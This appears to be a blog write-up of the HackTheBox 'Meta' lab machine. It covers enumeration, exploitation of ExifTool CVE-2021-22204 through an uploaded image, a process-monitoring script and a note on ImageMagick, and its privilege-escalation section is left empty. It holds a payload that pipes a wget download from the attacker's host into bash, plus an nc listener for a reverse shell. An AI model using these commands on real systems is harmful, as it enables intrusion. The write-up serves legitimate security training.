---
title: HackTheBox - Meta
categories: htb 
excerpt: | 
   Meta is a medium difficulty Linux machine.

feature_text: |
  ## Meta - Medium
  
feature_image: "https://picsum.photos/2560/600?image=733"
image: "https://picsum.photos/2560/600?image=733"
---

### Scanning process
sudo nmap -p- --open -sCV -n -Pn \<ip\> -oN targeted:
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 12:81:17:5a:5a:c9:c6:00:db:f0:ed:93:64:fd:1e:08 (RSA)
|   256 b5:e5:59:53:00:18:96:a6:f8:42:d8:c7:fb:13:20:49 (ECDSA)
|_  256 05:e9:df:71:b5:9f:25:03:6b:d0:46:8d:05:45:44:20 (ED25519)
80/tcp open  http    Apache httpd
|_http-title: Did not follow redirect to http://artcorp.htb
|_http-server-header: Apache
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
We have a simple page in production phase, but it seems like it hasn't any mistake. Let's turn to subdomains enumeration to enumerate others existing virtual hosts.
```
sudo gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://artcorp.htb -t 200
```

There is a new subdomain: dev01.artcorp.htb add it to the /etc/hosts. Here is an image uploader which seems to use an application to extract all metadata from your image.

Exif Tool: An utility to extract all metadata from an image input.

### Exploit vulnerabilities
Looking for an exploit of this utility, we will find a CVE on [AssassinUKG's](https://github.com/AssassinUKG/CVE-2021-22204) github profile.

It will create a new metadata with a command in base64. ExifTool will interprete it as a php code. 
```
sudo ./exploit.sh "system('wget -qO- http://<tu_ip> | bash')" happy.jpg
```
You have to create a shared service with python `python3 -m http.server 80` and listen at 443 port `rlwrap nc -lnvp 443` to receive an interactive console.

### Migrating of user


```
#!/bin/bash
process=$(ps -eo command)
while true; do
        new_process=$(ps -eo command)
        diff <(echo "$process") <(echo "$new_process") | grep "[\<\>]" | grep -vE "procmon|command|kworker"
        process=$new_process
done
```
>\> /bin/sh -c /usr/local/bin/convert\_images.sh
It is a script that use mogrify: Version: ImageMagick 7.0.10-36
### Privilege Scalation


Et voil√†! Congratulations 
